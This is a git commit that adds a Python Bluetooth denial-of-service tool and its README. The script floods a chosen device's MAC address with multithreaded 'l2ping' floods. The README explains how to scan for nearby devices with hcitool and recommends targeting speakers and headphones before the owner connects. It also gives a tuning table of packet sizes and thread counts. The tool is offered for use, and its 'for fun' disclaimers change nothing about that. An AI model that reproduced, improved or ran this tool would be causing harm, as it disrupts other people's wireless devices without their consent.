e3d6eec0823fbd521e27b085cde663971dde894e
BastardSam <93018824+BastardSam@users.noreply.github.com>
2021-10-22 14:19:03 -1100

    Add files via upload

---
+++ Bluetooth.py
@@ -0,0 +1,86 @@
+import os
+import threading
+import time
+
+def DOS(target_addr, packages_size):
+    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
+
+def printLogo():
+    print('                                                            Samrat Katwal                           ')
+    print('                                            This tool was made for fun and private use only!')
+    print('          ____ __ ___             __          ____________    __________________         __         ___________      _________')
+    print('          |   _ _ _  \           /  \         |  _________|   |______    ______|        /  \        |   - - -  \     |        \ ')
+    print('          |  |     |  |         / /\ \        |  |                   |  |              / /\ \       |  |     |  |    |   ___   \ ')
+    print('          |   - - -  /         / /  \ \       |  |                   |  |             / /  \ \      |   - - -   /    |  |   \   \ ')
+    print('          |       ---         / /____\ \      |  |________           |  |            / /____\ \     |  ____   _/     |  |    \  |')
+    print('          |   _ _ _  \       /  ______  \     |_________  |          |  |           / _______  \    |  |   \  \      |  |    /  / ')
+    print('          |  |     |  |     / /        \ \             |  |          |  |          / /        \ \   |  |    \  \     |  |___/  /')
+    print('          |   - - -   /    / /          \ \    ________|  |          |  |         / /          \ \  |  |     \  \    |        /')
+    print('          |___ __ ___/    /_/            \_\  |___________|          |__|        /_/            \_\ |__|      \__\   |_______/')
+    print('          \n        Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat Samrat')
+def main():
+    printLogo()
+    time.sleep(0.1)
+    print('\x1b[31m\nTry to target receiver devices like Speaker,Headphones,etc because it becomes 90% more effective than targetting sender devices!!Iam not responsible if you misuse this tool in any way!!')
+    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
+        time.sleep(1)
+        os.system('clear')
+        printLogo()
+        print('')
+
+        target_addr = input('Enter Mac address of bluetooth device > ')
+
+        if len(target_addr) < 1:
+            print('[!] ERROR: Enter the Mac address NOOB')
+            exit(0)
+
+        try:
+            packages_size = int(input('Enter packages to be sent > '))
+        except:
+            print('[!] ERROR: Packages must be an Integer NOOB')
+            exit(0)
+        try:
+            threads_count = int(input('Enter Count of threads > '))
+        except:
+            print('[!] ERROR: Threads count must be an integer Noob')
+            exit(0)
+        print('')
+        os.system('clear')
+
+        print("\x1b[31m[*] Executing Attack")
+        time.sleep(0.1)
+        print("Connecting with servers of Samrat")
+        time.sleep(2)
+        print("Asking for permissions with Mr. Bastard")
+        time.sleep(3)
+        print("Permission Granted!!")
+        time.sleep(1.5)
+        print("Starting attack in 3 sec...")
+
+        for i in range(0, 3):
+            print('[*] ' + str(3 - i))
+            time.sleep(1)
+        os.system('clear')
+        print('[*] Building threads...\n')
+
+        for i in range(0, threads_count):
+            print('[*] Built thread №' + str(i + 1))
+            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
+
+        print('[*] All thread have been built...')
+        print('[*] Sending Packages to target...')
+    else:
+        print('Bip bip')
+        exit(0)
+
+if __name__ == '__main__':
+    try:
+        os.system('clear')
+        main()
+    except KeyboardInterrupt:
+        time.sleep(0.1)
+        print('\n[*] Aborted')
+        exit(0)
+    except Exception as e:
+        time.sleep(0.1)
+        print('[!] ERROR: ' + str(e))
--- README.md
+++ README.md
@@ -1,2 +1,69 @@
-# btdos
-Dos attack a Bluetooth connection!
+<h1 align="center">Bluetooth Denial of service</h1>
+<p align="center">
+  <a href="https://python.org">
+  </a>
+</p>
+<p align="center">Script made for attacking Bluetooth Devices By Samrat Katwal. </p>
+
+
+
+## Warning
+<p align="center">This project was created only for fun purposes and personal use.</p>
+
+THIS SOFTWARE IS MADE BY MR.BASTARD.
+## To install
+
+
+```
+$ sudo apt update
+$ sudo apt install python3
+$ cd Bluetooth DOS/
+$ python3 Bluetooth.py
+```
+### NOte
+<p>The script works only with Linux systems.</p>
+<p>You must have "l2ping" util on your linux machine (it installed as default on Kali Linux).</p>
+<p>YOU MUST SCAN AND ATTACK BEFORE SOMEONE CONNECTS TO THE TARGET!!!</p>
+
+## How's it's tested
+Kali Linux as attacker, and JY-25 Bluetooth Speaker as target.
+
+## HOw to use
+<p>First of all, you must scan network for Bluetooth devises. For example, you can use "hcitool", scan and copy Mac address you may need to execute 'service bluetooth start'.</p>
+
+```
+$ sudo apt update
+$ apt install hcitool
+$ sudo service bluetooth start
+$ hcitool scan
+```
+<p>Output will be like:</p>
+
+```
+C1:E4:A4:D3:45      Jy-25
+B3:C2:E3:D4:F5      POCO C3
+D5:B2:F3:E4:A6      Some Bluetooth device
+```
+<p>Then copy target addres (for example "C1:E4:A4:D3:45") and paste it where Mac address is asked.</p>
+
+## Tutorial
+
+1. "Target addr" - addres of your target (Check info above).
+2. "Packages size" - size of the packages, that will be sent to the target. 600 is optimal.
+3. "Threads count" - number of threads, that will send packages to the target at the same time. I used 500 threads, and that was enough. Check the table below, to find optimal value.
+
+|  Packages size | Threads count| Ping, ms  | Distance, meters | Time waited, sec  | Device |
+|:--------------:|:-----: |:------------:|:--------------------:|:----------------:|:------:|
+|  600           | 1       | 9           |0,3                   |           5      |JY-25   |
+|  600           | 10      | 38          |0,3                   |           5      |JY-25   |
+|  600           | 20      | 78          |0,3                   |           5      |JY-25   |
+|  600           | 50      | 229         |0,3                   |           5      |JY-25   |
+|  600           | 100     | 413         |0,3                   |           5      |JY-25   |
+|  600           | 200     | 806         |0,3                   |           5      |JY-25   |
+|  600           | 500     | 1961        |0,3                   |           5      |JY-25   |
+|  600           | 1000    | 6621        |0,3                   |           5      |JY-25   |
+|  600           | 1000+   | ...         |0,3                   |           5      |JY-25   |
+
+## What happened to the target
+
+<p>I haven't tested on all devices, but the device i used worked perfecly.</p>
